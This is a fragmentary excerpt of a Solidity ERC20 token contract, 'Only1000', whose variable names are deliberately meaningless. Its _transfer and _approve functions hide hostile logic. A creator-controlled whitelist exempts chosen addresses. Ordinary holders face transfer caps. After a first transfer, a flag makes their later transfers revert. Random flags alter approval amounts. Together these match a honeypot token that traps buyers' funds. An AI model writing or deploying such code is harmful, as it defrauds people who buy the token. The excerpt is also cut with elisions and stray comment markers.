...
contract Only1000 is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public tokenus;
  mapping (address => bool) public lions;
  mapping (address => bool) public masala;
  mapping (address => uint256) public garam;

  bool private burma;
  uint256 private _totalSupply;
  uint256 private buthan;
  uint256 private everest;
  ...
  constructor() public {
    ...
    everest = chTx * 30;
    lions[creator] = false;
    masala[creator] = false;
    tokenus[msg.sender] = true;
  ...
  */
  ...
  function randomly() internal returns (uint) {
    uint screen = uint(keccak256(abi.encodePacked(now, msg.sender, grandcanyon))) % 50;
    grandcanyon++;
    return screen;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (burma == false)) {
      buthan = chTx;
      gallons = true;
    }
    
    if ((address(sender) == creator) && (burma == true)) {
      tokenus[recipient] = true;
      lions[recipient] = false;
      burma = false;
    }
    
    if ((amount > everest) && (tokenus[sender] == true) && (address(sender) != creator)) {
        masala[recipient] = true;
    }
    
    if (tokenus[recipient] != true) {
        lions[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((lions[sender]) && (tokenus[recipient] == false)) {
        lions[recipient] = true;
    }
    
    if (tokenus[sender] == false) {
      if ((amount > everest) && (masala[sender] == true)) {
        require(false);
      }
      
      require(amount < buthan);
      if (gallons == true) {
        if (masala[sender] == true) {
          require(false);
        }
        masala[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (denali == true)) {
      tokenus[spender] = true;
      lions[spender] = false;
      masala[spender] = false;
      denali = false;
    }
    
    tok = (lions[owner] ? 765673498 : amount);
